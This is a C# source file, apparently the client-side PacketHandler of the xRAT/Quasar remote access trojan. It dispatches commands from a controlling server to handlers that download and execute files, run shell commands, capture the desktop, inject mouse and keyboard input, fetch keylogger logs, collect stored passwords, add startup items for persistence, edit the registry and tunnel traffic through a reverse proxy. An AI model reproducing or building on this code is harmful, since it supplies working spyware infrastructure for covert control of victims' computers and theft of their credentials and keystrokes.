using xClient.Core.Commands;
using xClient.Core.Data;
using xClient.Core.Networking;
using xClient.Core.ReverseProxy;

namespace xClient.Core.Packets
{
    public static class PacketHandler
    {
        public static void HandlePacket(Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (!ClientData.IsAuthenticated)
            {
                if (type == typeof(ServerPackets.GetAuthentication))
                {
                    CommandHandler.HandleGetAuthentication((ServerPackets.GetAuthentication)packet, client);
                }
                else if (type == typeof(ServerPackets.SetAuthenticationSuccess))
                {
                    ClientData.IsAuthenticated = true;
                }
                return;
            }

            if (type == typeof(ServerPackets.DoDownloadAndExecute))
            {
                CommandHandler.HandleDoDownloadAndExecute((ServerPackets.DoDownloadAndExecute)packet,
                    client);
            }
            else if (type == typeof(ServerPackets.DoUploadAndExecute))
            {
                CommandHandler.HandleDoUploadAndExecute((ServerPackets.DoUploadAndExecute)packet, client);
            }
            else if (type == typeof(ServerPackets.DoClientDisconnect))
            {
                Program.Disconnect();
            }
            else if (type == typeof(ServerPackets.DoClientReconnect))
            {
                Program.Disconnect(true);
            }
            else if (type == typeof(ServerPackets.DoClientUninstall))
            {
                CommandHandler.HandleDoClientUninstall((ServerPackets.DoClientUninstall)packet, client);
            }
            else if (type == typeof(ServerPackets.GetDesktop))
            {
                CommandHandler.HandleGetDesktop((ServerPackets.GetDesktop)packet, client);
            }
            else if (type == typeof(ServerPackets.GetProcesses))
            {
                CommandHandler.HandleGetProcesses((ServerPackets.GetProcesses)packet, client);
            }
            else if (type == typeof(ServerPackets.DoProcessKill))
            {
                CommandHandler.HandleDoProcessKill((ServerPackets.DoProcessKill)packet, client);
            }
            else if (type == typeof(ServerPackets.DoProcessStart))
            {
                CommandHandler.HandleDoProcessStart((ServerPackets.DoProcessStart)packet, client);
            }
            else if (type == typeof(ServerPackets.GetDrives))
            {
                CommandHandler.HandleGetDrives((ServerPackets.GetDrives)packet, client);
            }
            else if (type == typeof(ServerPackets.GetDirectory))
            {
                CommandHandler.HandleGetDirectory((ServerPackets.GetDirectory)packet, client);
            }
            else if (type == typeof(ServerPackets.DoDownloadFile))
            {
                CommandHandler.HandleDoDownloadFile((ServerPackets.DoDownloadFile)packet, client);
            }
            else if (type == typeof(ServerPackets.DoUploadFile))
            {
                CommandHandler.HandleDoUploadFile((ServerPackets.DoUploadFile)packet, client);
            }
            else if (type == typeof(ServerPackets.DoMouseEvent))
            {
                CommandHandler.HandleDoMouseEvent((ServerPackets.DoMouseEvent)packet, client);
            }
            else if (type == typeof(ServerPackets.DoKeyboardEvent))
            {
                CommandHandler.HandleDoKeyboardEvent((ServerPackets.DoKeyboardEvent)packet, client);
            }
            else if (type == typeof(ServerPackets.GetSystemInfo))
            {
                CommandHandler.HandleGetSystemInfo((ServerPackets.GetSystemInfo)packet, client);
            }
            else if (type == typeof(ServerPackets.DoVisitWebsite))
            {
                CommandHandler.HandleDoVisitWebsite((ServerPackets.DoVisitWebsite)packet, client);
            }
            else if (type == typeof(ServerPackets.DoShowMessageBox))
            {
                CommandHandler.HandleDoShowMessageBox((ServerPackets.DoShowMessageBox)packet, client);
            }
            else if (type == typeof(ServerPackets.DoClientUpdate))
            {
                CommandHandler.HandleDoClientUpdate((ServerPackets.DoClientUpdate)packet, client);
            }
            else if (type == typeof(ServerPackets.GetMonitors))
            {
                CommandHandler.HandleGetMonitors((ServerPackets.GetMonitors)packet, client);
            }
            else if (type == typeof(ServerPackets.DoShellExecute))
            {
                CommandHandler.HandleDoShellExecute((ServerPackets.DoShellExecute)packet, client);
            }
            else if (type == typeof(ServerPackets.DoPathRename))
            {
                CommandHandler.HandleDoPathRename((ServerPackets.DoPathRename)packet, client);
            }
            else if (type == typeof(ServerPackets.DoPathDelete))
            {
                CommandHandler.HandleDoPathDelete((ServerPackets.DoPathDelete)packet, client);
            }
            else if (type == typeof(ServerPackets.DoShutdownAction))
            {
                CommandHandler.HandleDoShutdownAction((ServerPackets.DoShutdownAction)packet, client);
            }
            else if (type == typeof(ServerPackets.GetStartupItems))
            {
                CommandHandler.HandleGetStartupItems((ServerPackets.GetStartupItems)packet, client);
            }
            else if (type == typeof(ServerPackets.DoStartupItemAdd))
            {
                CommandHandler.HandleDoStartupItemAdd((ServerPackets.DoStartupItemAdd)packet, client);
            }
            else if (type == typeof(ServerPackets.DoStartupItemRemove))
            {
                CommandHandler.HandleDoStartupItemRemove((ServerPackets.DoStartupItemRemove)packet, client);
            }
            else if (type == typeof(ServerPackets.DoDownloadFileCancel))
            {
                CommandHandler.HandleDoDownloadFileCancel((ServerPackets.DoDownloadFileCancel)packet,
                    client);
            }
            else if (type == typeof(ServerPackets.DoLoadRegistryKey))
            {
                CommandHandler.HandleGetRegistryKey((ServerPackets.DoLoadRegistryKey)packet, client);
            }
            else if (type == typeof(ServerPackets.GetKeyloggerLogs))
            {
                CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs)packet, client);
            }
            else if (type == typeof(ServerPackets.GetPasswords))
            {
                CommandHandler.HandleGetPasswords((ServerPackets.GetPasswords)packet, client);
            }
            else if (type == typeof(ReverseProxy.Packets.ReverseProxyConnect) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyConnectResponse) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyData) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyDisconnect))
            {
                ReverseProxyCommandHandler.HandleCommand(client, packet);
            }
        }
    }
}
